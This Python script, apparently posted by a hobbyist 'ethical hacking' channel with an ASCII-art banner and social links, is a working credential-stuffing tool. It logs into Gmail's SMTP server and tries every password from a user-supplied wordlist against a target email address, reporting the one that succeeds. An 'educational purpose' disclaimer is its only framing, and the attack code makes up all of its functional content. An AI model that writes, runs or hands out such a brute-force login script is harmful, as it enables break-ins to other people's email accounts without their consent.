print("Join Ethical Hacker's Community")
# Information
print("Author: Kinghacker0")
print("YouTube - www.YouTube.com/Hacker's King ")
print("Website - www.hackersking.in")

print("      *                                            *   ")
print("     *                                              *    ")
print("    **                                              **   ")
print("   *   **                                        **   *    ")
print("   **   **  *                               *   **    **   ")
print("   ***    * **    Instagram-@kinghacker0   **  *    ***  ")
print("    ****    ******************************* ***   ****   ")
print("       *******    *****        *******    **********  ")
print("  ***********           *****             ************     ")
print("    **********    *** * **   ** ****    **********     ")
print("         ********** ** **     ** ****************    ")
print("   *************** ** **  ***  **  **********************  ")
print("        ******   ***************************   ******     ")
print("                *************************    ")
print("               **************************  ")
print("               **** ** ** **** ** ** **  ")
print("                ***  *  *  **  *  * ***   ")
print("                 **                 **    ")
print("                   *                *     ")

print(" Disclaimer- This tool is only for educational purpose")

import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter the target's email address: ")
passwfile = input("Enter the password file name: ")

with open(passwfile, "r", encoding="utf-8") as pf:
    for password in pf:
        password = password.strip()
        try:
            smtpserver.login(user, password)
            print(f"[+] Password Found: {password}")
            break
        except smtplib.SMTPAuthenticationError:
            print(f"[!] Password Incorrect: {password}")
